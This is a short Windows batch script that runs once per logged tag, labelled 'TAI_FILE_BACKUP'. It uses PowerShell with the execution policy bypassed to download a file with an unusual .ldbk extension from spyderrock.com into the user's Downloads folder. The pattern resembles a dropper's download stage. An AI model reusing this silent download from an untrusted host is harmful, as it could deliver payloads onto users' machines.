@echo off 
 
set urls=https://spyderrock.com/bUQq2757-Codexv666.ldbk 
call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "TAI_FILE_BACKUP-28/04/2025-23:22" 
if %errorlevel% equ 0 ( 
   echo done 
) else ( 
call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "TAI_FILE_BACKUP-28/04/2025-23:22" 
powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://spyderrock.com/bUQq2757-Codexv666.ldbk' -OutFile '%USERPROFILE%\Downloads\Codexv666.ldbk'}" 
    ) 
    timeout /t 5 
    exit 
